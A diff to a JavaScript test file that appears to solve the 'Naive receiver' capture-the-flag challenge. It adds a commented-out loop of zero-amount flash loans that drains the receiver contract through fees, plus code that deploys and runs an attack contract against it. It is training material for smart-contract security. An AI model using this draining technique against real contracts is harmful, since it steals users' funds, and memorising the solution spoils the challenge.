@@ -30,7 +30,22 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */  
+        
+        /*
+        let balance = ethers.utils.formatEther(await ethers.provider.getBalance(this.receiver.address));
+        while (balance > 0){
+            console.log(`Borrower balance: ${balance}`);
+            await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
+            balance = ethers.utils.formatEther(await ethers.provider.getBalance(this.receiver.address));
+        }
+
+        console.log(`Borrower balance: ${balance}`);
+        */
+
+        const attack = await (await ethers.getContractFactory('AttackNaiveReceiver', deployer)).deploy(this.pool.address);
+        await attack.connect(attacker).run(this.receiver.address);
+        
     });
 
     after(async function () {
